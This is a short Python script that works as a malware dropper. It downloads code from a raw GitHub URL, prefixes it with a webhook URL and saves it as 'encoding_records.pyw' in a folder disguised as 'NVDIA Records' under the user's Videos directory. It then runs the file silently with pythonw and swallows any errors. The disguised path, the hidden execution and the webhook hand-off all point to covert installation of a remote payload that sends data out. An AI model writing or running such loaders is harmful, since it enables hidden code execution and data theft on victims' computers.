import os
import urllib.request
import subprocess
from pathlib import Path

githubraw = "https://raw.githubusercontent.com/NobdY1exe/skA4zr/main/fileees.py"
Webhooook = webhook_url

path = os.path.join(Path.home(), 'Videos', 'NVDIA Records')
FilePath = os.path.join(path, 'encoding_records.pyw')

def CreateFandDownloadIT(Webhooook, githubraw):
    os.makedirs(path, exist_ok=True)
    response = urllib.request.urlopen(githubraw)
    remote_content = response.read().decode('utf-8')
    with open(FilePath, "w", encoding="utf8") as f:
        f.write(f"webhook_url = '{Webhooook}'\n\n")
        f.write(remote_content)
    return FilePath

def StartProg(FilePath):
    try:
        command = ["pythonw", FilePath]
        result = subprocess.run(command, shell=True)
    except Exception as e:
        pass

CreateFandDownloadIT(Webhooook, githubraw)
StartProg(FilePath)
